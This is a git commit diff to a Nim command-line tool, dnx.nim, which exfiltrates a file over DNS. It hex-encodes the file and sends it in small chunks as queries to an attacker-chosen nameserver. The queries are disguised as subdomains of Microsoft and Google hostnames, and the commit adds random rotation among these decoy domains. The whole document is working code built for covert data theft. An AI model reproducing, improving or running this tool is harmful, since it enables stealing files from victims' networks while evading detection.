c0ea85044c4c17ed299d1ff2185215a67c11800a
g0ttfrid <yurimaia@protonmail.ch>
2023-04-07 22:46:30 -0300

    Update dnx.nim

--- dnx.nim
+++ dnx.nim
@@ -2,7 +2,8 @@ import std/[os, strutils, random, sha1]
 import pkg/ndns
 randomize()
 
-proc resolve(client: DnsClient, data: string): void =
+proc resolvX(ns: string, data: string): void =
+    let client = initDnsClient(ns)
     try:
         discard resolveIpv4(client, data, 1)
     except CatchableError as e:
@@ -14,31 +15,34 @@ proc resolve(client: DnsClient, data: string): void =
             #echo "[DEBUG] ERROR ", data
             quit(e.msg)
 
-proc chuckIndX(client: DnsClient, data: string, chuckSize: int, domain: string, slp: int): void =
+proc chuckX(ns: string, data: string, slp: int, domain = ""): void =
+    let
+        chuckSize = 20 # max 62
+        domains = [".client.a.msn.windows.com", ".a.wns.update.windows.com", ".a.wns.o365.microsoft.com", ".msft.a.msn.microsoft.com"]
     var stringindex: int
+    var d = domain
     while stringindex <= data.len-1:
+        if domain == "": d = sample(domains)
         let
             query =  data[stringindex .. (if stringindex + chuckSize - 1 > data.len - 1: data.len - 1 else: stringindex + chuckSize - 1)]
-            dnsquery = query & domain
+            dnsquery = query & d
 
-        resolve(client, dnsquery)
+        resolvX(ns, dnsquery)
         inc(stringindex, chuckSize)
         sleep(slp)
 
-proc dnsExfil(ns: string, file: string, slp: int): void =
+proc dnX(ns: string, file: string, slp: int): void =
     let
-        client = initDnsClient(ns)
         content = readFile(file)
+        filename = splitPath(file)
         hash = secureHash(content)
         hex = content.toHex
-        chuckSize = 20 # max 62
-        domains = [".client.a.msn.windows.com", ".a.wns.update.windows.com", ".a.wns.o365.microsoft.com", ".msft.a.msn.microsoft.com"]
-    
+
     echo "[+] Sending ", file, " [lengh: ", content.len, "][hash: ", hash, "]" 
     
-    chuckIndX(client, file.toHex, chuckSize, ".bb.googleusercontent.com", slp)
-    chuckIndX(client, hex, chuckSize, sample(domains), slp)
-    resolve(client, "quit")
+    chuckX(ns, toHex(filename.tail), slp, ".bb.googleusercontent.com")
+    chuckX(ns, hex, slp)
+    resolvX(ns, "quit")
 
     echo "[+] Done!"
 
@@ -49,4 +53,4 @@ when isMainModule:
         echo "[!] e.g: dnx.exe 13.37.13.37 file.pdf 1000"
         quit()
     else:
-        dnsExfil(paramStr(1), paramStr(2), parseInt(paramStr(3)))
+        dnX(paramStr(1), paramStr(2), parseInt(paramStr(3)))
